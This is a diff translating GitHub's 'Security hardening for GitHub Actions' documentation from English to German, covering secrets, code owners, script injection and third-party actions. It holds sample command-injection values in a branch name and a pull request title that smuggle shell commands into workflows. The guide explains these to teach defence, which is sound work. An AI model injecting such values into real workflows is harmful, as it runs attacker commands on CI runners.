@@ -1,7 +1,7 @@
 ---
-title: Security hardening for GitHub Actions
+title: Sicherheitshärtung für GitHub Actions
 shortTitle: Security hardening
-intro: 'Good security practices for using {% data variables.product.prodname_actions %} features.'
+intro: 'Best Practices zur Sicherheit bei der Verwendung von {% data variables.product.prodname_actions %}-Features'
 redirect_from:
   - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
   - /actions/learn-github-actions/security-hardening-for-github-actions
@@ -14,67 +14,71 @@ type: overview
 topics:
   - Security
 miniTocMaxHeadingLevel: 3
+ms.openlocfilehash: 0f93496361500083c23ef6f5095a785855246503
+ms.sourcegitcommit: b617c4a7a1e4bf2de3987a86e0eb217d7031490f
+ms.translationtype: HT
+ms.contentlocale: de-DE
+ms.lasthandoff: 11/11/2022
+ms.locfileid: '148161215'
 ---
+{% data reusables.actions.enterprise-beta %} {% data reusables.actions.enterprise-github-hosted-runners %}
 
-{% data reusables.actions.enterprise-beta %}
-{% data reusables.actions.enterprise-github-hosted-runners %}
+## Übersicht
 
-## Overview
+In diesem Leitfaden wird erläutert, wie du die Sicherheitshärtung für bestimmte {% data variables.product.prodname_actions %}-Features konfigurierst. Wenn du noch nicht mit den Konzepten von {% data variables.product.prodname_actions %} vertraut bist, findest du unter [Core concepts for GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions) („Wichtigste Konzepte für GitHub Actions“) weitere Informationen.
 
-This guide explains how to configure security hardening for certain {% data variables.product.prodname_actions %} features. If the {% data variables.product.prodname_actions %} concepts are unfamiliar, see "[Core concepts for GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)."
+## Verwenden von Geheimnissen
 
-## Using secrets
+Vertrauliche Werte sollten niemals als Klartext in Workflowdateien, sondern als Geheimnisse gespeichert werden. [Geheimnisse](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) können auf Organisations-, Repository- oder Umgebungsebene konfiguriert werden und ermöglichen das Speichern vertraulicher Informationen in {% data variables.product.product_name %}.
 
-Sensitive values should never be stored as plaintext in workflow files, but rather as secrets. [Secrets](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) can be configured at the organization, repository, or environment level, and allow you to store sensitive information in {% data variables.product.product_name %}.
+Damit die Geheimnisse verschlüsselt werden, bevor sie {% data variables.product.product_name %} erreichen, werden [versiegelte libsodium-Felder](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes) verwendet. Dieser Schritt erfolgt, wenn das Geheimnis über die [Benutzeroberfläche](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) oder über die [REST-API](/rest/reference/actions#secrets) übermittelt wird. Durch diese clientseitige Verschlüsselung lassen sich die Risiken im Zusammenhang mit der versehentlichen Protokollierung (z. B. Ausnahmeprotokolle und Anforderungsprotokolle) innerhalb der {% data variables.product.product_name %}-Infrastruktur minimieren. Sobald das Geheimnis hochgeladen wurde, ist {% data variables.product.product_name %} in der Lage, das Geheimnis zu entschlüsseln, damit es in die Workflowlaufzeit eingefügt werden kann.
 
-Secrets use [Libsodium sealed boxes](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes), so that they are encrypted before reaching {% data variables.product.product_name %}. This occurs when the secret is submitted [using the UI](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) or through the [REST API](/rest/reference/actions#secrets). This client-side encryption helps minimize the risks related to accidental logging (for example, exception logs and request logs, among others) within {% data variables.product.product_name %}'s infrastructure. Once the secret is uploaded, {% data variables.product.product_name %} is then able to decrypt it so that it can be injected into the workflow runtime.
+Zum Verhindern einer versehentlichen Offenlegung verwendet {% data variables.product.product_name %} einen Mechanismus, der versucht, Geheimnisse zu bearbeiten, die in Ausführungsprotokollen erscheinen. Bei diesem Bearbeitungsschritt wird nach exakten Übereinstimmungen für konfigurierte Geheimnisse sowie nach gemeinsamen Codierungen der Werte (z. B. Base64) gesucht. Da es jedoch mehrere Möglichkeiten gibt, einen geheimen Wert zu transformieren, kann diese Bearbeitung nicht garantiert werden. Aus diesem Grund solltest du mithilfe bestimmter proaktiver Schritte und bewährter Methoden sicherstellen, dass Geheimnisse bearbeitetet werden und weitere Risiken im Zusammenhang mit Geheimnissen gemindert werden:
 
-To help prevent accidental disclosure, {% data variables.product.product_name %} uses a mechanism that attempts to redact any secrets that appear in run logs. This redaction looks for exact matches of any configured secrets, as well as common encodings of the values, such as Base64. However, because there are multiple ways a secret value can be transformed, this redaction is not guaranteed. As a result, there are certain proactive steps and good practices you should follow to help ensure secrets are redacted, and to limit other risks associated with secrets:
-
-- **Never use structured data as a secret**
-    - Structured data can cause secret redaction within logs to fail, because redaction largely relies on finding an exact match for the specific secret value. For example, do not use a blob of JSON, XML, or YAML (or similar) to encapsulate a secret value, as this significantly reduces the probability the secrets will be properly redacted. Instead, create individual secrets for each sensitive value.
-- **Register all secrets used within workflows**
-    - If a secret is used to generate another sensitive value within a workflow, that generated value should be formally [registered as a secret](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret), so that it will be redacted if it ever appears in the logs. For example, if using a private key to generate a signed JWT to access a web API, be sure to register that JWT as a secret or else it won’t be redacted if it ever enters the log output.
-    - Registering secrets applies to any sort of transformation/encoding as well. If your secret is transformed in some way (such as Base64 or URL-encoded), be sure to register the new value as a secret too.
-- **Audit how secrets are handled**
-    - Audit how secrets are used, to help ensure they’re being handled as expected. You can do this by reviewing the source code of the repository executing the workflow, and checking any actions used in the workflow. For example, check that they’re not sent to unintended hosts, or explicitly being printed to log output.
-    - View the run logs for your workflow after testing valid/invalid inputs, and check that secrets are properly redacted, or not shown. It's not always obvious how a command or tool you’re invoking will send errors to `STDOUT` and `STDERR`, and secrets might subsequently end up in error logs. As a result, it is good practice to manually review the workflow logs after testing valid and invalid inputs.
-- **Use credentials that are minimally scoped**
-    - Make sure the credentials being used within workflows have the least privileges required, and be mindful that any user with write access to your repository has read access to all secrets configured in your repository. 
-    - Actions can use the `GITHUB_TOKEN` by accessing it from the `github.token` context. For more information, see "[Contexts](/actions/learn-github-actions/contexts#github-context)." You should therefore make sure that the `GITHUB_TOKEN` is granted the minimum required permissions. It's good security practice to set the default permission for the `GITHUB_TOKEN` to read access only for repository contents. The permissions can then be increased, as required, for individual jobs within the workflow file. For more information, see "[Authentication in a workflow](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)." 
-- **Audit and rotate registered secrets**
-    - Periodically review the registered secrets to confirm they are still required. Remove those that are no longer needed.
-    - Rotate secrets periodically to reduce the window of time during which a compromised secret is valid.
-- **Consider requiring review for access to secrets**
-    - You can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, see "[Encrypted secrets](/actions/reference/encrypted-secrets)" and "[Using environments for deployment](/actions/deployment/using-environments-for-deployment)."
+- **Verwende niemals strukturierte Daten als Geheimnis**
+    - Bei strukturierten Daten können bei der Bearbeitung des Geheimnisses innerhalb von Protokollen Fehler auftreten. Der Grund dafür ist, dass die Bearbeitung weitgehend davon abhängig ist, dass eine exakte Übereinstimmung für den spezifischen geheimen Wert gefunden wird. Verwende z. B. kein JSON-, XML-, YAML- oder ein ähnliches Blob, um einen geheimen Wert zu kapseln, da die Wahrscheinlichkeit, dass die Geheimnisse ordnungsgemäß bearbeitet werden, dadurch erheblich sinkt. Erstelle stattdessen einzelne Geheimnisse für jeden vertraulichen Wert.
+- **Registriere alle Geheimnisse, die in Workflows verwendet werden**
+    - Wenn ein Geheimnis verwendet wird, um einen anderen vertraulichen Wert in einem Workflow zu generieren, sollte dieser generierte Wert formal [als geheim registriert](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) werden, damit er in Protokollen gegebenenfalls bearbeitet wird. Wenn du z. B. einen privaten Schlüssel zum Generieren eines signierten JWT für den Zugriff auf eine Web-API verwendest, musst du das JWT als Geheimnis registrieren. Anderenfalls wird das Token nicht bearbeitet, wenn es in einer Protokollausgabe erscheint.
+    - Die Registrierung von Geheimnissen gilt auch für jegliche Art von Transformation/Codierung. Wenn dein Geheimnis transformiert wird (z. B. bei der Base64- oder URL-Codierung), musst du auch den neuen Wert als geheim registrieren.
+- **Überprüfe, wie Geheimnisse verarbeitet werden**
+    - Du solltest überprüfen, ob Geheimnisse wie erwartet verwendet werden. Überprüfe dazu im Quellcode des Repositorys, das den Workflow ausführt, alle Aktionen, die im Workflow verwendet werden. Stelle z. B. sicher, dass vertrauliche Informationen nicht an unbeabsichtigte Hosts gesendet werden oder explizit in der Protokollausgabe ausgegeben werden.
+    - Sieh dir die Ausführungsprotokolle für deinen Workflow an, nachdem du gültige/ungültige Eingaben getestet hast, und überprüfe, ob Geheimnisse ordnungsgemäß bearbeitet bzw. nicht angezeigt werden. Es ist nicht immer offensichtlich, wie ein aufgerufener Befehl oder ein aufgerufenes Tool Fehler an `STDOUT` und `STDERR` sendet. So ist es möglich, dass Geheimnisse in Fehlerprotokollen erscheinen. Daher empfiehlt es sich, die Workflowprotokolle nach dem Testen gültiger und ungültiger Eingaben manuell zu überprüfen.
+- **Verwende Anmeldeinformationen mit minimalen Berechtigungen**
+    - Stelle sicher, dass die in Workflows verwendeten Anmeldeinformationen über den geringsten erforderlichen Umfang an Berechtigungen verfügen, und beachte, dass Benutzer*innen mit Schreibzugriff auf dein Repository auch über Lesezugriff auf alle Geheimnisse verfügen, die in deinem Repository konfiguriert sind. 
+    - Aktionen können `GITHUB_TOKEN` verwenden, indem sie über den `github.token`-Kontext darauf zugreifen. Weitere Informationen findest du unter [Contexts](/actions/learn-github-actions/contexts#github-context) („Kontexte“). Aus diesem Grund solltest du sicherstellen, dass `GITHUB_TOKEN` die geringsten erforderlichen Berechtigungen erteilt werden. Es empfiehlt sich, als Standardberechtigung für `GITHUB_TOKEN` lediglich Lesezugriff auf Repositoryinhalte festzulegen. Die Berechtigungen können dann nach Bedarf für einzelne Aufträge in der Workflowdatei erhöht werden. Weitere Informationen findest du unter [Authentifizierung in einem Workflow](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token). 
+- **Überprüfe und rotiere registrierte Geheimnisse**
+    - Überprüfe die registrierten Geheimnisse regelmäßig, um sicherzustellen, dass sie noch erforderlich sind. Entferne Geheimnisse, die nicht mehr benötigt werden.
+    - Rotiere Geheimnisse regelmäßig, um das Zeitfenster zu verringern, in dem ein kompromittiertes Geheimnis gültig ist.
+- **Lege gegebenenfalls fest, dass beim Zugriff auf Geheimnisse eine Überprüfung erforderlich ist**
+    - Du kannst festlegen, dass eine Genehmigung durch einen Prüfer erforderlich ist, um Umgebungsgeheimnisse zu schützen. So kann ein Workflowauftrag erst dann auf Umgebungsgeheimnisse zugreifen, nachdem ein Prüfer die entsprechende Genehmigung erteilt hat. Weitere Informationen zum Speichern von Geheimnissen in Umgebungen oder zum Festlegen von erforderlichen Überprüfungen für Umgebungen findest du unter [Encrypted secrets](/actions/reference/encrypted-secrets) („Verschlüsselte Geheimnisse“) und [Using environments for deployment](/actions/deployment/using-environments-for-deployment) („Verwenden von Umgebungen für die Bereitstellung“).
 
 {% warning %}
 
-**Warning**: Any user with write access to your repository has read access to all secrets configured in your repository. Therefore, you should ensure that the credentials being used within workflows have the least privileges required.
+**Warnung**: Alle Benutzer*innen mit Schreibzugriff auf dein Repository verfügen über Lesezugriff auf alle Geheimnisse, die in deinem Repository konfiguriert sind. Aus diesem Grund solltest du sicherstellen, dass die in Workflows verwendeten Anmeldeinformationen über die geringsten erforderlichen Berechtigungen verfügen.
 
 {% endwarning %}
 
-## Using `CODEOWNERS` to monitor changes
+## Verwenden von `CODEOWNERS` zum Überwachen von Änderungen
 
-You can use the `CODEOWNERS` feature to control how changes are made to your workflow files. For example, if all your workflow files are stored in `.github/workflows`, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer.
+Mithilfe des Features `CODEOWNERS` kannst du steuern, wie Änderungen an deinen Workflowdateien vorgenommen werden. Wenn alle deine Workflowdateien z. B. in `.github/workflows` gespeichert sind, kannst du dieses Verzeichnis der Codebesitzerliste hinzufügen, damit alle vorgeschlagenen Änderungen an diesen Dateien zuerst von einem benannten Prüfer genehmigt werden müssen.
 
-For more information, see "[About code owners](/github/creating-cloning-and-archiving-repositories/about-code-owners)."
+Weitere Informationen findest du unter [About code owners](/github/creating-cloning-and-archiving-repositories/about-code-owners) („Informationen zu Codebesitzern“).
 
-## Understanding the risk of script injections
+## Informationen zum Risiko der Skripteinschleusung
 
-When creating workflows, [custom actions](/actions/creating-actions/about-actions), and [composite actions](/actions/creating-actions/creating-a-composite-action) actions, you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner.
+Beim Erstellen von Workflows, [benutzerdefinierten Aktionen](/actions/creating-actions/about-actions) und [zusammengesetzten Aktionen](/actions/creating-actions/creating-a-composite-action) solltest du immer überprüfen, ob dein Code gegebenenfalls nicht vertrauenswürdige Eingaben von Angreifer*innen ausführen kann. Dies kann passieren, wenn Angreifer*innen bösartige Befehle und Skripts zu einem Kontext hinzufügen. Bei der Ausführung deines Workflows werden diese Zeichenfolgen möglicherweise als Code interpretiert, der dann im Runner ausgeführt wird.
 
- Attackers can add their own malicious content to the [`github` context](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), which should be treated as potentially untrusted input. These contexts typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, and `title`.  For example: `github.event.issue.title`, or `github.event.pull_request.body`.
+ Angreifer*innen können dem [`github`-Kontext](/actions/reference/context-and-expression-syntax-for-github-actions#github-context) eigene bösartige Inhalte hinzufügen, die als potenziell nicht vertrauenswürdige Eingaben behandelt werden sollten. Diese Kontexte enden üblicherweise auf `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref` und `title`.  Beispiel: `github.event.issue.title` oder `github.event.pull_request.body`
 
- You should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of {% data variables.product.prodname_actions %}. For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."
+ Du solltest sicherstellen, dass diese Werte nicht direkt in Workflows, Aktionen, API-Aufrufen oder an anderen Stellen eingefügt werden, an denen sie als ausführbarer Code interpretiert werden können. Indem du denselben defensiven Programmieransatz wie bei anderem privilegiertem Anwendungscode verwendest, kannst du zur Sicherheitshärtung bei der Verwendung von {% data variables.product.prodname_actions %} beitragen. Informationen zu möglichen Schritten, die Angreifer*innen ausführen können, findest du unter [Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner) („Potenzielle Auswirkungen eines kompromittierten Runners“).
 
-In addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, `zzz";echo${IFS}"hello";#` would be a valid branch name and would be a possible attack vector for a target repository.
+Darüber hinaus gibt es weitere weniger offensichtliche Quellen für potenziell nicht vertrauenswürdige Eingaben. Dazu zählen z. B. Verzweigungsnamen und E-Mail-Adressen, die in Bezug auf ihre zulässigen Inhalte ziemlich flexibel sein können. `zzz";echo${IFS}"hello";#` ist beispielsweise ein zulässiger Verzweigungsname, der ein möglicher Angriffsvektor für ein Zielrepository wäre.
 
-The following sections explain how you can help mitigate the risk of script injection.
+In den folgenden Abschnitten wird erläutert, wie du das Risiko der Skripteinschleusung verringern kannst.
 
-### Example of a script injection attack
+### Beispiel für einen Angriff durch Skripteinschleusung
 
-A script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:
+Ein Angriff durch Skripteinschleusung kann direkt innerhalb des Inlineskripts eines Workflows auftreten. Im folgenden Beispiel verwendet eine Aktion einen Ausdruck, um die Gültigkeit eines Pull Request-Titels zu testen. Dies geht jedoch mit dem Risiko der Skripteinschleusung einher:
 
 {% raw %}
 ```
@@ -91,23 +95,23 @@ A script injection attack can occur directly within a workflow's inline script. 
 ```
 {% endraw %}
 
-This example is vulnerable to script injection because the `run` command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside {% raw %}`${{ }}`{% endraw %} are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection.
+Bei diesem Beispiel besteht das Risiko der Skripteinschleusung, da der Befehl `run` innerhalb eines temporären Shellskripts im Runner ausgeführt wird. Vor der Ausführung des Shellskripts werden die Ausdrücke innerhalb von {% raw %}`${{ }}`{% endraw %} ausgewertet und anschließend durch die resultierenden Werte ersetzt. Bei diesem Vorgang besteht die Möglichkeit, dass Shellbefehle eingeschleust werden.
 
-To inject commands into this workflow, the attacker could create a pull request with a title of  `a"; ls $GITHUB_WORKSPACE"`:
+Angreifer*innen könnten einen Pull Request mit dem Titel `a"; ls $GITHUB_WORKSPACE"` erstellen, um Befehle in diesem Workflow einzuschleusen:
 
-![Example of script injection in PR title](/assets/images/help/images/example-script-injection-pr-title.png)
+![Beispiel für die Skripteinschleusung im Titel eines Pull Requests](/assets/images/help/images/example-script-injection-pr-title.png)
 
-In this example, the `"` character is used to interrupt the {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %} statement, allowing the `ls` command to be executed on the runner. You can see the output of the `ls` command in the log:
+In diesem Beispiel wird die {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %}-Anweisung mithilfe des Zeichens `"` unterbrochen, damit der Befehl `ls` im Runner ausgeführt werden kann. Die Ausgabe des Befehls `ls` erscheint im Protokoll:
 
-![Example result of script injection](/assets/images/help/images/example-script-injection-result.png)
+![Beispiel für das Ergebnis einer Skripteinschleusung](/assets/images/help/images/example-script-injection-result.png)
 
-## Good practices for mitigating script injection attacks
+## Bewährte Methoden zum Verhindern von Angriffen durch Skripteinschleusung
 
-There are a number of different approaches available to help you mitigate the risk of script injection:
+Es gibt verschiedene Ansätze, um das Risiko der Skripteinschleusung zu verhindern:
 
-### Using an action instead of an inline script (recommended)
+### Verwenden einer Aktion anstelle eines Inlineskripts (empfohlen)
 
-The recommended approach is to create an action that processes the context value as an argument. This approach is not vulnerable to the injection attack, as the context value is not used to generate a shell script, but is instead passed to the action as an argument:
+Bei dieser empfohlenen Vorgehensweise erstellst du eine Aktion, die den Kontextwert als Argument verarbeitet. Da der Kontextwert bei diesem Ansatz nicht zum Generieren eines Shellskripts verwendet wird, sondern stattdessen als Argument an die Aktion übergeben wird, wird das Risiko der Skripteinschleusung minimiert:
 
 {% raw %}
 ```
@@ -117,11 +121,11 @@ with:
 ```
 {% endraw %}
 
-### Using an intermediate environment variable
+### Verwenden einer Zwischenumgebungsvariable
 
-For inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable.
+Bei Inlineskripts sollte der Wert des Ausdrucks auf eine Zwischenumgebungsvariable festgelegt werden, um nicht vertrauenswürdige Eingaben zu verhindern.
 
-The following example uses Bash to process the `github.event.pull_request.title` value as an environment variable:
+Im folgenden Beispiel wird Bash verwendet, um den `github.event.pull_request.title`-Wert als Umgebungsvariable zu verarbeiten:
 
 {% raw %}
 ```
@@ -139,95 +143,94 @@ The following example uses Bash to process the `github.event.pull_request.title`
 ```
 {% endraw %}
 
-In this example, the attempted script injection is unsuccessful:
+In diesem Beispiel ist der Versuch der Skripteinschleusung nicht erfolgreich:
 
-![Example of mitigated script injection](/assets/images/help/images/example-script-injection-mitigated.png)
+![Beispiel für eine nicht erfolgreiche Skripteinschleusung](/assets/images/help/images/example-script-injection-mitigated.png)
 
-With this approach, the value of the {% raw %}`${{ github.event.issue.title }}`{% endraw %} expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoid [word splitting](https://github.com/koalaman/shellcheck/wiki/SC2086), but this is [one of many](https://mywiki.wooledge.org/BashPitfalls) general recommendations for writing shell scripts, and is not specific to {% data variables.product.prodname_actions %}.
+Bei dieser Vorgehensweise wird der Wert des {% raw %}`${{ github.event.issue.title }}`{% endraw %}-Ausdrucks im Arbeitsspeicher gespeichert und als Variable verwendet. Es findet keine Interaktion mit dem Skriptgenerierungsprozess statt. Darüber hinaus solltest du gegebenenfalls Shellvariablen mit doppelten Anführungszeichen verwenden, um eine [Wortteilung](https://github.com/koalaman/shellcheck/wiki/SC2086) zu vermeiden. Dies ist jedoch [eine der vielen](https://mywiki.wooledge.org/BashPitfalls) allgemeinen Empfehlungen zum Schreiben von Shellskripts, die nicht speziell für {% data variables.product.prodname_actions %} gilt.
 
 {% ifversion fpt or ghec %}
-### Using starter workflows for code scanning
+### Verwenden von Startworkflows für die Codeüberprüfung
 
-{% data reusables.advanced-security.starter-workflows-beta %}
-{% data variables.product.prodname_code_scanning_capc %} allows you to find security vulnerabilities before they reach production. {% data variables.product.product_name %} provides starter workflows for {% data variables.product.prodname_code_scanning %}. You can use these suggested workflows to construct your {% data variables.product.prodname_code_scanning %} workflows, instead of starting from scratch. {% data variables.product.company_short%}'s workflow, the {% data variables.code-scanning.codeql_workflow %}, is powered by {% data variables.product.prodname_codeql %}. There are also third-party starter workflows available.
+Die {% data reusables.advanced-security.starter-workflows-beta %} {% data variables.product.prodname_code_scanning_capc %} ermöglicht die Ermittlung von Sicherheitsrisiken, bevor Code in einer Produktionsumgebung verwendet wird. {% data variables.product.product_name %} bietet Startworkflows für die {% data variables.product.prodname_code_scanning %}. Du kannst diese vorgeschlagenen Workflows zum Erstellen von Workflows zur {% data variables.product.prodname_code_scanning %} verwenden. So musst du die Workflows nicht von Grund auf neu erstellen. Der Workflow von {% data variables.product.company_short%}, der {% data variables.code-scanning.codeql_workflow %}, basiert auf {% data variables.product.prodname_codeql %}. Es stehen auch Startworkflows von Drittanbietern zur Verfügung.
 
-For more information, see "[About {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)" and "[Setting up {% data variables.product.prodname_code_scanning %} using starter workflows](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)."
+Weitere Informationen findest du unter [About {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning) („Informationen zur Codeüberprüfung“) und [Setting up {% data variables.product.prodname_code_scanning %} using starter workflows](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows) („Einrichten der Codeüberprüfung mithilfe von Startworkflows“).
 
 {% endif %}
 
-### Restricting permissions for tokens
+### Einschränken von Berechtigungen für Token
 
-To help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, see "[Modifying the permissions for the GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)."
+Du solltest die zugewiesenen Berechtigungen einschränken, um das Risiko offengelegter Token zu mindern. Weitere Informationen findest du unter [Modifying the permissions for the GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token) („Ändern der Berechtigungen für GITHUB_TOKEN“).
 
 {% ifversion fpt or ghec or ghes > 3.4 %}
 
-## Using OpenID Connect to access cloud resources
+## Verwenden von OpenID Connect für den Zugriff auf Cloudressourcen
 
 {% data reusables.actions.about-oidc-short-overview %}
 
 {% endif %}
 
-## Using third-party actions
+## Verwenden von Drittanbieteraktionen
 
-The individual jobs in a workflow can interact with (and compromise) other jobs. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.
+Die einzelnen Aufträge in einem Workflow können mit anderen Aufträgen interagieren (und diese kompromittieren). Beispiel: Ein Auftrag, der die von einem späteren Auftrag verwendeten Umgebungsvariablen abfragt, Dateien in ein freigegebenes Verzeichnis schreibt, das von einem späteren Auftrag verarbeitet wird, oder sogar direkt mit dem Docker-Socket interagiert, andere ausgeführte Container überprüft und Befehle in diesen Containern ausführt.
 
-This means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use the `GITHUB_TOKEN` to write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on {% data variables.product.prodname_dotcom %}. For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."
+Eine einzelne kompromittierte Aktion in einem Workflow kann also große Auswirkungen haben, da diese kompromittierte Aktion Zugriff auf alle Geheimnisse hat, die in deinem Repository konfiguriert sind. Außerdem kann diese Aktion gegebenenfalls `GITHUB_TOKEN` verwenden, um Inhalte in das Repository zu schreiben. Folglich besteht ein erhebliches Risiko, wenn Aktionen aus Drittanbieterrepositorys in {% data variables.product.prodname_dotcom %} ausgeführt werden. Informationen zu möglichen Schritten, die Angreifer*innen ausführen können, findest du unter [Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner) („Potenzielle Auswirkungen eines kompromittierten Runners“).
 
-You can help mitigate this risk by following these good practices:
+Du kannst dieses Risiko verringern, indem du die folgenden bewährten Methoden anwendest:
 
-* **Pin actions to a full length commit SHA**
+* **Hefte Aktionen an einen Commit-SHA voller Länge an**
 
-  Pinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload.
+  Das Anheften einer Aktion an einen Commit-SHA voller Länge ist derzeit die einzige Möglichkeit, eine Aktion als unveränderliche Version zu verwenden. Durch das Anheften an einen bestimmten SHA wird das Risiko von Angriffen verringert, bei denen eine Hintertür zum Repository der Aktion hinzugefügt wird. Der Grund dafür ist, dass in diesem Fall eine SHA-1-Kollision für eine gültige Git-Objektpayload generiert werden müsste.
 
-* **Audit the source code of the action**
+* **Überprüfe den Quellcode der Aktion**
 
-  Ensure that the action is handling the content of your repository and secrets as expected. For example, check that secrets are not sent to unintended hosts, or are not inadvertently logged.
+  Stelle sicher, dass die Aktion den Inhalt deines Repositorys und deine Geheimnisse wie erwartet verarbeitet. Überprüfe beispielsweise, ob Geheimnisse nicht an unbeabsichtigte Hosts gesendet oder nicht versehentlich protokolliert werden.
 
-* **Pin actions to a tag only if you trust the creator**
+* **Hefte Aktionen nur dann an Tags, wenn du den Ersteller als vertrauenswürdig einstufst**
 
-  Although pinning to a commit SHA is the most secure option, specifying a tag is more convenient and is widely used. If you’d like to specify a tag, then be sure that you trust the action's creators. The ‘Verified creator’ badge on {% data variables.product.prodname_marketplace %} is a useful signal, as it indicates that the action was written by a team whose identity has been verified by {% data variables.product.prodname_dotcom %}. Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action.
+  Wenngleich das Anheften an einen Commit-SHA die sicherste Möglichkeit ist, ist das Angeben eines Tags unkomplizierter und eine weitverbreitete Vorgehensweise. Wenn du ein Tag angeben möchtest, stelle sicher, dass du den Erstellern der Aktion vertraust. Der Badge für überprüfte Ersteller in {% data variables.product.prodname_marketplace %} zeigt an, dass die Aktion von einem Team erstellt wurde, dessen Identität von {% data variables.product.prodname_dotcom %} überprüft und bestätigt wurde. Beachte, dass diese Vorgehensweise auch dann ein Risiko birgt, wenn der oder die Ersteller*in als vertrauenswürdig eingestuft wird. Der Grund dafür ist, dass ein Tag verschoben oder gelöscht werden kann, wenn ein*e böswillige*r Akteur*in Zugriff auf das Repository erhält, in dem die Aktion gespeichert ist.
 
 {% ifversion fpt or ghes > 3.3 or ghae > 3.3 or ghec %}
-## Reusing third-party workflows
+## Wiederverwenden von Drittanbieterworkflows
 
-The same principles described above for using third-party actions also apply to using third-party workflows. You can help mitigate the risks associated with reusing workflows by following the same good practices outlined above. For more information, see "[Reusing workflows](/actions/learn-github-actions/reusing-workflows)."
+Die oben beschriebenen Grundsätze für die Verwendung von Drittanbieteraktionen gelten auch für die Verwendung von Drittanbieterworkflows. Wende die oben beschriebenen bewährten Methoden auch bei Workflows an, um die Risiken bei der Wiederverwendung von Workflows zu verringern. Weitere Informationen findest du unter [Reusing workflows](/actions/learn-github-actions/reusing-workflows) („Wiederverwenden von Workflows“).
 {% endif %}
 
 {% ifversion internal-actions %}
-## Allowing workflows to access internal repositories
+## Hinzufügen von Workflows für den Zugriff auf interne Repositorys
 
-{% data reusables.actions.outside-collaborators-internal-actions %} For more information, see "[Sharing actions and workflows with your enterprise](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)."
+{% data reusables.actions.outside-collaborators-internal-actions %} Weitere Informationen findest du unter [Sharing actions and workflows with your enterprise](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise) („Freigeben von Aktionen und Workflows für dein Unternehmen“).
 {% endif %}
 
 {% ifversion allow-actions-to-approve-pr %}
-## Preventing {% data variables.product.prodname_actions %} from {% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating or {% endif %}approving pull requests
+## Hindern von {% data variables.product.prodname_actions %} am {% ifversion allow-actions-to-approve-pr-with-ent-repo %}Erstellen oder {% endif %}Genehmigen von Pull Requests
 
-{% data reusables.actions.workflow-pr-approval-permissions-intro %} Allowing workflows, or any other automation, to {% ifversion allow-actions-to-approve-pr-with-ent-repo %}create or {% endif %}approve pull requests could be a security risk if the pull request is merged without proper oversight.
